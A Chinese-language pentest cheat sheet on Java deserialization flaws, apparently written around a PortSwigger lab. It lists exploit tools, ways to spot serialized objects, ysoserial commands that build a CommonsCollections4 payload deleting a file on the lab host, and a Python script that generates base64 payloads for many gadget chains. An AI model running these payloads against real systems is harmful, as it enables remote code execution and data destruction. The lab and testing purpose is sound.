# Java反序列化漏洞

## 靶机

[PortSwigger](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons)

[java deserialize webapp](https://github.com/hvqzao/java-deserialize-webapp)

## 工具

[ysoserial](https://github.com/frohoff/ysoserial)

[ysoserial modified](https://github.com/pimps/ysoserial-modified)

[JRE8u20 RCE Gadget](https://github.com/pwntester/JRE8u20_RCE_Gadget)

[jexboss](https://github.com/joaomatosf/jexboss)

[SerialBrute](https://github.com/NickstaDB/SerialBrute)

[SerializationDumper](https://github.com/NickstaDB/SerializationDumper)

[gadgetprobe](https://labs.bishopfox.com/gadgetprobe)

[marshalsec](https://github.com/mbechler/marshalsec)


## 检测

1.白盒

在代码中查找实现 Serialized 接口的类和java.io.ObjectInputStream、readObject、readUnshare 函数的使用

```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```

2.黑盒

对于黑盒测试，查找表示 java 序列化对象（源自 ObjectInputStream）的特定签名或Magic Bytes：

+ 十六进制模式：AC ED 00 05
+ Base64 模式：rO0
+ Content-type 设置为 application/x-java-serialized-object 的 HTTP 响应标头
+ 指示先前压缩的十六进制模式：1F 8B 08 00
+ 表示先前压缩的 Base64 模式：H4sIA
+ 具有 .faces 扩展名和 faces.ViewState 参数的 Web 文件
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```

Burp扩展利用工具

[Java Serial Killer](https://github.com/NetSPI/JavaSerialKiller)

[Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner)

[burp ysoserial](https://github.com/summitt/burp-ysoserial)

[SuperSerial](https://github.com/DirectDefense/SuperSerial)

[SuperSerial Active](https://github.com/DirectDefense/SuperSerial-Active)

## 简单漏洞利用

Apache Commons Collections
```bash
Java16及更高版本
java -jar ysoserial-all.jar \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
   --add-opens=java.base/java.net=ALL-UNNAMED \
   --add-opens=java.base/java.util=ALL-UNNAMED \
   CommonsCollections4 'rm /home/carlos/morale.txt' | base64

java15及以下：
java -jar ysoserial-all.jar CommonsCollections4 "rm /home/carlos/morole.txt" | base64
```

脚本:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
    for payload in payloads:
        final = cmd.replace('REPLACE', payload)
        print 'Generating ' + payload + ' for ' + name + '...'
        command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
        result = command.read()
        command.close()
        encoded = base64.b64encode(result)
        if encoded != "":
            open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
